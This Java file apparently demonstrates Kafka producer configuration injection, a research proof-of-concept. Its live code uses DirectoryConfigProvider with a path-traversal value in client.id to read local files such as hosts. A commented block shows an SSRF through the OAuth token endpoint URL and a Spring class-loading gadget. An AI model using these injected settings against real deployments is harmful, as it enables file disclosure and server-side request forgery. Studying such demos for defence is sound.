package com.github.enokiy.kafkaDemo;

import org.apache.kafka.clients.producer.KafkaProducer;
import org.apache.kafka.clients.producer.ProducerConfig;
import org.apache.kafka.clients.producer.ProducerRecord;
import org.apache.kafka.common.serialization.StringSerializer;

import java.util.HashMap;
import java.util.Map;

public class ProducerConfigInject {
    public static void main(String[] args) {
        // kafkaConfig 外部可控 ssrf
//        Map<String,String> kafkaConfig = new HashMap<>();
//        kafkaConfig.put("bootstrap.servers","127.0.0.1:9092");
//        kafkaConfig.put("security.protocol","SASL_SSL");
//        kafkaConfig.put("ssl.engine.factory.class","org.springframework.context.support.ClassPathXmlApplicationContext");
//        kafkaConfig.put("sasl.oauthbearer.token.endpoint.url","http://127.0.0.1:8888/ssrf/evil/url"); // SSRF URL
//        kafkaConfig.put("sasl.login.callback.handler.class","org.apache.kafka.common.security.oauthbearer.secured.OAuthBearerLoginCallbackHandler");
//        kafkaConfig.put("sasl.mechanism","OAUTHBEARER");  // sasl.machanism为GSSAPI或OAUTHBEARER
//        kafkaConfig.put("sasl.jaas.config","org.apache.kafka.common.security.oauthbearer.OAuthBearerLoginModule required clientId='enokiy' scope='enokiy' param1=foo param2=foo2 clientSecret='enokiy';");

        Map<String,String> kafkaConfig = new HashMap<>();
        kafkaConfig.put("bootstrap.servers","127.0.0.1:9092");
//        kafkaConfig.put("producerName","test");
//        kafkaConfig.put("producerPassword","123456");
//        kafkaConfig.put("SSL","true");
//        kafkaConfig.put("sasl.mechanism","SASL_SSL");
//        kafkaConfig.put("security.protocol","SASL_PLAINTEXT");
        kafkaConfig.put("config.providers","enokiytest"); //
        kafkaConfig.put("config.providers.enokiytest.class","org.apache.kafka.common.config.provider.DirectoryConfigProvider");
        kafkaConfig.put("client.id","${enokiytest:..\\..\\..\\..\\..\\..\\tmp:hosts}"); //linux ${enokiytest:/etc:hosts}
        kafkaConfig.put("sasl.jaas.config","org.apache.kafka.common.security.plain.PlainLoginModule required username=\"name\" password=\"password\";");

        Map<String,Object> configs = new HashMap<>(16);
        configs.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());
        configs.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());
        configs.putAll(kafkaConfig);

        //Create the Kafka producer
        KafkaProducer<String, String> producer = new KafkaProducer<>(configs);
        ProducerRecord<String,String> producerRecord= new ProducerRecord<>("fisrt_topic","hello");
        producer.send(producerRecord);
        producer.flush();
        producer.close();
    }
}
